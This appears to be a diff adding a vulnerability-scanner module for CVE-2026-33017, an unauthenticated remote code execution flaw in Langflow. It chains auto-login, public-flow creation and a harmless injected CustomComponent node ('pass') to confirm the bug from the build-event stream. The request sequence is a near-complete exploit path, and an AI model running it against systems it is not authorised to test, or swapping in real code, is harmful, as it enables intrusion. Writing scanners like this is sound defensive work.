@@ -1,0 +1,154 @@
+info:
+  name: langflow_cve_2026_33017_vuln
+  author: NSK-394
+  severity: 9.8
+  description: >
+    CVE-2026-33017 (CVSS 9.8) is an unauthenticated RCE in Langflow <= 1.8.2
+    via the /api/v1/build_public_tmp/{{flow_id}}/flow endpoint, which processes
+    attacker-controlled flow node definitions instead of using only the stored
+    flow data. The official fix in 1.9.0 removes this behavior entirely, ignoring
+    attacker-supplied node data and building only the stored (empty) flow.
+    This module detects the vulnerable input-validation flaw by submitting a
+    uniquely-identified CustomComponent node and checking whether the server's
+    build-event stream references it. Testing against 1.8.2 (vulnerable) and
+    1.9.0 (patched) shows: vulnerable instances process and reference the
+    injected node (visible as processing errors); patched instances discard
+    it before processing (empty vertex list in events). This confirms the
+    vulnerability's root cause (improper input handling); it does not
+    independently verify code execution. Non-destructive detection suitable
+    for production scanning.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2026-33017
+    - https://github.com/langflow-ai/langflow/security/advisories/GHSA-vwmf-pq79-vjvx
+  profiles:
+    - vuln
+    - http
+    - critical_severity
+    - cve
+    - cve2026
+    - langflow
+    - rce
+
+payloads:
+  - library: http
+    steps:
+      # Step 1: Obtain unauthenticated access token via AUTO_LOGIN (default enabled)
+      - method: get
+        timeout: 5
+        headers:
+          User-Agent: Nettacker
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "http://{target}:7860/api/v1/auto_login"
+        response:
+          save_to_temp_events_only: token
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "200"
+              reverse: false
+            content:
+              regex: access_token
+              reverse: false
+
+      # Step 2: Create a public flow (required to obtain flow_id for build endpoint)
+      - method: post
+        timeout: 5
+        headers:
+          User-Agent: Nettacker
+          Content-Type: application/json
+          Authorization: "Bearer dependent_on_temp_event[0]['content'][0]"
+        ssl: false
+        json:
+          name: nettacker_check
+          data:
+            nodes: []
+            edges: []
+          access_type: PUBLIC
+        url:
+          nettacker_fuzzer:
+            input_format: "http://{target}:7860/api/v1/flows/"
+        response:
+          dependent_on_temp_event: token
+          save_to_temp_events_only: flow_id
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "20[01]"
+              reverse: false
+            content:
+              regex: '"id"'
+              reverse: false
+
+      # Step 3: Submit attacker-controlled flow data to build_public_tmp
+      # On vulnerable versions, this node data is accepted and processed.
+      # On patched versions, it is silently discarded before graph construction.
+      - method: post
+        timeout: 10
+        headers:
+          User-Agent: Nettacker
+          Content-Type: application/json
+          Authorization: "Bearer dependent_on_temp_event[0]['content'][0]"
+          Cookie: "client_id=nettacker"
+        ssl: false
+        json:
+          data:
+            nodes:
+              - id: nettacker_vuln_check
+                type: genericNode
+                position:
+                  x: 0
+                  y: 0
+                data:
+                  type: CustomComponent
+                  id: nettacker_vuln_check
+                  node:
+                    template:
+                      _type: CustomComponent
+                      code:
+                        value: "pass"
+                        type: code
+            edges: []
+        url:
+          nettacker_fuzzer:
+            input_format: "http://{target}:7860/api/v1/build_public_tmp/dependent_on_temp_event[1]['content'][0]/flow"
+        response:
+          save_to_temp_events_only: job_id
+          dependent_on_temp_event: "token,flow_id"
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "200"
+              reverse: false
+            content:
+              regex: job_id
+              reverse: false
+
+      # Step 4: Poll build-event stream to detect vulnerable behavior
+      # Vulnerable (1.8.2): server processes our injected node, error mentions our node id
+      # Patched (1.9.0): server discards our node, builds only empty flow (empty vertices list)
+      # Detection signal: presence of our distinctive node id in any event (error or otherwise)
+      # vs. absence/empty vertices list (patched). This confirms the endpoint processes
+      # attacker-supplied node data on vulnerable versions only.
+      - method: get
+        timeout: 15
+        headers:
+          User-Agent: Nettacker
+          Authorization: "Bearer dependent_on_temp_event[0]['content'][0]"
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "http://{target}:7860/api/v1/build/dependent_on_temp_event[1]['content'][0]/events"
+        response:
+          dependent_on_temp_event: "token,flow_id,job_id"
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "200"
+              reverse: false
+            content:
+              # Match detection: our injected node id appears anywhere in event stream
+              # (vulnerable versions reference it during processing; patched versions ignore it)
+              regex: nettacker_vuln_check
+              reverse: false
